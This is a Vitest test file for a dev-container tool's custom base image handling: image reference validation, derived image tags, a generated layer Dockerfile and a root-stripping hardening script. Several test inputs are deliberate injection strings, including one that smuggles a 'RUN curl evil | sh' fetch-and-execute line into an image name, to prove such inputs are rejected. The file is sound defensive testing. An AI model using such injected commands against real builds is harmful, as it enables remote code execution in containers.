import { describe, it, expect } from 'vitest';
import { execFileSync } from 'child_process';
import fs from 'fs';
import os from 'os';
import path from 'path';
import {
  isValidImageRef,
  imageRepo,
  withDefaultTag,
  needsHuddleLayer,
  derivedImageName,
  buildLayerDockerfile,
  HUDDLE_LAYER_SCRIPT,
  HUDDLE_LAYER_VERSION,
} from '../src/custom-image';

// Custom base images: an image Huddle did not build never runs as-is. It gets
// the Huddle layer (dev user, root stripped, doctor) in a derived image.

const BASES = ['ghcr.io/infosupport/base-devimage-intellij', 'ghcr.io/infosupport/base-devimage-vscode:experiment-147'];

describe('isValidImageRef', () => {
  it.each([
    'node', 'node:22-bookworm', 'library/ubuntu:24.04', 'ghcr.io/org/img:1.2.3',
    'localhost:5000/team/img', `alpine@sha256:${'a'.repeat(64)}`, 'mcr.microsoft.com/devcontainers/base:debian',
  ])('accepts %s', ref => expect(isValidImageRef(ref)).toBe(true));

  it.each([
    '', 'Node', 'node\nRUN id', 'node rm', 'node"x', '../x', 'node:', 'a'.repeat(256),
  ])('rejects %j', ref => expect(isValidImageRef(ref)).toBe(false));
});

describe('imageRepo / withDefaultTag', () => {
  it('strips tag and digest, but not a registry port', () => {
    expect(imageRepo('localhost:5000/img:1')).toBe('localhost:5000/img');
    expect(imageRepo('localhost:5000/img')).toBe('localhost:5000/img');
    expect(imageRepo(`node@sha256:${'b'.repeat(64)}`)).toBe('node');
  });

  it('adds :latest only when there is no tag or digest', () => {
    expect(withDefaultTag('node')).toBe('node:latest');
    expect(withDefaultTag('localhost:5000/img')).toBe('localhost:5000/img:latest');
    expect(withDefaultTag('node:22')).toBe('node:22');
    expect(withDefaultTag(`node@sha256:${'c'.repeat(64)}`)).toBe(`node@sha256:${'c'.repeat(64)}`);
  });
});

describe('needsHuddleLayer', () => {
  it('runs Huddle base images (any tag) and snapshots as-is', () => {
    expect(needsHuddleLayer('ghcr.io/infosupport/base-devimage-intellij:latest', undefined, BASES)).toBe(false);
    expect(needsHuddleLayer('ghcr.io/infosupport/base-devimage-vscode', undefined, BASES)).toBe(false);
    expect(needsHuddleLayer('my-snap:1', { 'com.devcontainer.snapshot': 'true' }, BASES)).toBe(false);
  });

  it('layers any other image, even when it claims the Huddle label', () => {
    expect(needsHuddleLayer('node:22', undefined, BASES)).toBe(true);
    expect(needsHuddleLayer('evil/img', { 'io.huddle.layer': 'custom', 'io.huddle.layer.version': HUDDLE_LAYER_VERSION }, BASES)).toBe(true);
  });

  it('trusts derived images only for the current layer version', () => {
    const ok = { 'io.huddle.layer': 'custom', 'io.huddle.layer.version': HUDDLE_LAYER_VERSION };
    expect(needsHuddleLayer('huddle-custom/node:abc-l1', ok, BASES)).toBe(false);
    expect(needsHuddleLayer('huddle-custom/node:abc-l0', { ...ok, 'io.huddle.layer.version': '0' }, BASES)).toBe(true);
    expect(needsHuddleLayer('huddle-custom/node:abc', undefined, BASES)).toBe(true);
  });
});

describe('derivedImageName', () => {
  it('is a valid local tag per image id and layer version', () => {
    const name = derivedImageName('ghcr.io/org/my_img:1.0', `sha256:${'0123456789ab'.repeat(5)}abcd`);
    expect(name).toBe(`huddle-custom/ghcr.io-org-my_img:0123456789ab-l${HUDDLE_LAYER_VERSION}`);
    expect(isValidImageRef(name)).toBe(true);
    expect(needsHuddleLayer(name, { 'io.huddle.layer': 'custom', 'io.huddle.layer.version': HUDDLE_LAYER_VERSION }, BASES)).toBe(false);
  });
});

describe('buildLayerDockerfile', () => {
  it('runs the layer as root and leaves the image as vscode', () => {
    const df = buildLayerDockerfile('node:22');
    expect(df.split('\n')).toEqual(expect.arrayContaining([
      'FROM node:22', 'USER root', 'RUN sh /opt/huddle/huddle-layer.sh', 'USER vscode',
    ]));
    expect(df).toContain(`io.huddle.layer.version="${HUDDLE_LAYER_VERSION}"`);
  });

  it('refuses a reference that could inject Dockerfile instructions', () => {
    expect(() => buildLayerDockerfile('node\nRUN curl evil | sh')).toThrow(/Invalid image reference/);
  });
});

describe('HUDDLE_LAYER_SCRIPT', () => {
  it('is valid POSIX sh', () => {
    const file = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'huddle-layer-')), 'huddle-layer.sh');
    fs.writeFileSync(file, HUDDLE_LAYER_SCRIPT);
    expect(() => execFileSync('sh', ['-n', file])).not.toThrow();
  });

  it('replaces the whole sudo policy and strips the root routes', () => {
    for (const fragment of [
      'cat > /etc/sudoers <<', 'rm -rf /etc/sudoers.d', 'rm -rf /etc/doas.conf', "usermod -p '!' root",
      'chmod u-s,g-s', 'gpasswd -d "$DEV" "$g"', 'rm -f /etc/ssh/ssh_host_*',
    ]) expect(HUDDLE_LAYER_SCRIPT).toContain(fragment);
    const sudoers = HUDDLE_LAYER_SCRIPT.split("cat > /etc/sudoers <<'EOF'\n")[1].split('\nEOF\n')[0];
    expect(sudoers).not.toMatch(/NOPASSWD/);
    expect(sudoers).not.toMatch(/vscode/);
  });

  it('ends with doctor checks that fail the build', () => {
    expect(HUDDLE_LAYER_SCRIPT).toContain('check "sudo denies $DEV"');
    expect(HUDDLE_LAYER_SCRIPT).toContain('[ "$ok" = 1 ] || fail "doctor checks failed"');
  });
});
